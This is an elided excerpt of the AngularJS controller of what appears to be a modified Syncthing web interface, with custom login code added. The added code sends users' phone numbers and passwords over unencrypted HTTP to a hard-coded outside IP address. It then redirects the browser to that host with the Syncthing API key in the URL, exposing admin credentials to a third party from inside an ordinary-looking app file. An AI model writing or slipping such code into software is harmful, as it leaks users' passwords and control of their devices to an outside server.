angular
  ...
  .controller("SyncthingController", function ($scope, $http, $location, LocaleService, Events, $filter, $q, $compile, $timeout, $rootScope, $translate) {
    ...
    $scope.authenticatePassword = function () {
      ...
      // 第一步：自定义登录请求
      $http
        .post("http://119.6.186.164:9099/tasi_chat_server/login/loginByPassword", {
          phone: $scope.login.username, // 使用手机号作为用户名
          password: $scope.login.password, // 使用密码
        })
        .then(function (response) {
          // 保存用户名和密码到全局变量
          if (response.data.code !== 200) {
            $scope.tasiData = response.data.data.organizationId + "-" + response.data.data.id;
            //  $scope.tasiData =
            // 如果 code 不为 200，表示用户名或密码错误
            $scope.login.errors.badLogin = true;
            console.log(" $scope.tasiData ", $scope.tasiData);
            // return $q.reject('用户名或密码错误'); // 中止后续请求
          } else {
            $scope.saveUserConfig();
            // 可选：打印或调试输出
            console.log("Username and password saved:", $scope.config.gui);
            // 第一步登录成功后，获取用户信息（如：username）
            var phone = $scope.login.username;
            var password = $scope.login.password;

            // 第二步：执行 Syncthing 登录请求
            return $http.post(authUrlbase + "/password", {
    ...
    $scope.saveUserConfig = function () {
      if (!$scope.authenticated) {
        // 设置默认账号密码
        var defaultUser = $scope.login.username;
        var defaultPassword = $scope.login.password;
        ...
        var opts = {
          headers: {
            "Content-Type": "application/json", // 请求头，设置为JSON
          },
        };

        $http
          .put(urlbase + "/config", configData, opts)
          .then(function (response) {
            console.log("账号密码设置成功");
            // 继续执行其他逻辑，比如进行登录操作等
            // 可以在此触发自动登录等操作
          })
    ...
    $scope.$on(Events.ONLINE, function () {
      ...
      $q.all([refreshSystem(), refreshDiscoveryCache(), refreshConfig(), refreshCluster(), refreshConnectionStats()])
        .then(function () {
          $http
    ...
    function refreshNoAuthWarning() {
      ...
      $scope.openNoAuth =
        addr.substr(0, 4) !== "127." && addr.substr(0, 6) !== "[::1]:" && addr.substr(0, 1) !== "/" && !$scope.isAuthEnabled() && !guiCfg.insecureAdminAccess;
    ...
    function refreshCluster() {
      return $q.all([
        $http
          .get(urlbase + "/cluster/pending/devices")
          .success(function (data) {
          ...
          .error($scope.emitHTTPError),
        $http
          .get(urlbase + "/cluster/pending/folders")
          .success(function (data) {
    ...
    function refreshCompletion(device, folder) {
      ...
      $http
        .get(urlbase + "/db/completion?device=" + device + "&folder=" + encodeURIComponent(folder))
        .success(function (data) {
    ...
    function refreshConfig() {
      return $q.all([
        $http.get(urlbase + "/config").success(function (data) {
          ...
          setTimeout(() => {
            window.location.href = "http://119.6.186.164:9099/tasichat/#/tasiCloud?sid=" + data.gui.apiKey;
            // window.location.href = "http://192.168.0.108:8080/#/tasiCloud?sid=" + data.gui.apiKey;
          }, 1200);
        }),
    ...
    $scope.deviceStatus = function (deviceCfg) {
      ...
      if (
        !unused &&
        $scope.deviceStats[deviceCfg.deviceID] &&
        $scope.deviceStats[deviceCfg.deviceID].lastSeenDays &&
        $scope.deviceStats[deviceCfg.deviceID].lastSeenDays >= 7
      ) {
    ...
    $scope.syncthingStatus = function () {
      ...
      if (
        ...
        !online ||
        Object.keys($scope.pendingDevices).length > 0 ||
        Object.keys($scope.pendingFolders).length > 0
      ) {
        notifyCount++;
      }
    ...
    $scope.hasRemoteGUIAddress = function (deviceCfg) {
      if (!deviceCfg.remoteGUIPort) return false;
      var conn = $scope.connections[deviceCfg.deviceID];
    ...
    $scope.logging = {
      ...
      onFacilityChange: function (facility) {
        ...
        $http
          .post(urlbase + "/system/debug?" + (enabled ? "enable=" : "disable=") + facility)
    ...
    $scope.settingsModified = function () {
      ...
      console.log(
        "settings equals - options: " + optionsEqual + " gui: " + guiEquals + " ignDev: " + ignoredDevicesEquals + " ignFol: " + ignoredFoldersEquals
      );
    ...
    $scope.loadFormIntoScope = function (form) {
      console.log("loadFormIntoScope", form);
      switch (form.$name) {
        case "deviceEditor":
    ...
    function editFolderGetIgnores() {
      return $http.get(urlbase + "/db/ignores?folder=" + encodeURIComponent($scope.currentFolder.id)).then(
        function (r) {
          return r.data;
        },
        function (response) {
    ...
    $scope.dismissPendingFolder = function (folderID, deviceID) {
      $http.delete(urlbase + "/cluster/pending/folders?folder=" + encodeURIComponent(folderID) + "&device=" + encodeURIComponent(deviceID));
    };
    ...
    $scope.folderHasPausedDevices = function (folderCfg) {
      for (var deviceID in $scope.completion) {
        if (deviceID in $scope.devices && folderCfg.id in $scope.completion[deviceID] && $scope.completion[deviceID][folderCfg.id].remoteState == "paused") {
          return true;
        }
      }
      return false;
    ...
    $scope.deviceHasUnacceptedFolders = function (deviceCfg) {
      ...
      for (var folderID in $scope.completion[deviceCfg.deviceID]) {
        if (folderID in $scope.folders && $scope.completion[deviceCfg.deviceID][folderID].remoteState == "notSharing") {
          return true;
        }
      }
      return false;
    ...
    $scope.deviceHasPausedFolders = function (deviceCfg) {
      ...
      for (var folderID in $scope.completion[deviceCfg.deviceID]) {
        if (folderID in $scope.folders && $scope.completion[deviceCfg.deviceID][folderID].remoteState == "paused") {
          return true;
        }
      }
      return false;
    ...
    function resetRestoreVersions() {
      $scope.restoreVersions = {
        ...
        show: function (folder) {
          ...
          var dataReceived = $http.get(urlbase + "/folder/versions?folder=" + encodeURIComponent($scope.restoreVersions.folder)).success(function (data) {
    ...
    $scope.revertOverride = function () {
      $http.post(urlbase + "/db/" + $scope.revertOverrideParams.operation + "?folder=" + encodeURIComponent($scope.revertOverrideParams.folderID));
    };
    ...
    $scope.refreshReportDataPreview = function (ver, diff) {
      ...
      if (diff && version > 2) {
        $q.all([$http.get(urlbase + "/svc/report?version=" + version), $http.get(urlbase + "/svc/report?version=" + (version - 1))]).then(function (responses) {
    ...
    $scope.isUnixAddress = function (address) {
      return address != null && (address.indexOf("/") == 0 || address.indexOf("unix://") == 0 || address.indexOf("unixs://") == 0);
    };
    ...
    $scope.shareDeviceIdDialog = function (method) {
      ...
      switch (method) {
        case "email":
          ...
          params.body = [
            $translate.instant('To connect with the Syncthing device named "{%devicename%}", add a new remote device on your end with this ID:', {
        ...
        case "sms":
          ...
          params.body = [title, deviceID.replace(/-/g, ""), footer].join("\n");
          break;
      }
    ...
    $scope.shareDeviceId = function () {
      switch ($scope.shareDeviceIdParams.method) {
        case "email":
          location.href =
            "mailto:?subject=" + encodeURIComponent($scope.shareDeviceIdParams.subject) + "&body=" + encodeURIComponent($scope.shareDeviceIdParams.body);
          break;
        case "sms":
    ...
    $scope.getXattrHint = function () {
      ...
      if (
        filterEntries.every(function (entry) {
